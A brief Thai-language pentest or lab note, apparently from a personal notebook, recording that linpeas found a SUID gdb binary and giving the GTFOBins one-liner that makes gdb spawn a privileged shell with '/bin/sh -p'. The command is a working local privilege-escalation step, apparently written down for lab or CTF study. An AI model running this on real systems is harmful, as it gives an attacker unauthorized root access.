[[SUID]] 

จากภาพด้านล่างเป็นการพบ gdb ที่สามารถใช้ [GTFOBINS](https://gtfobins.github.io/gtfobins/gdb/#suid) ได้ 

![[linpeas-1.png]]

```bash
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```
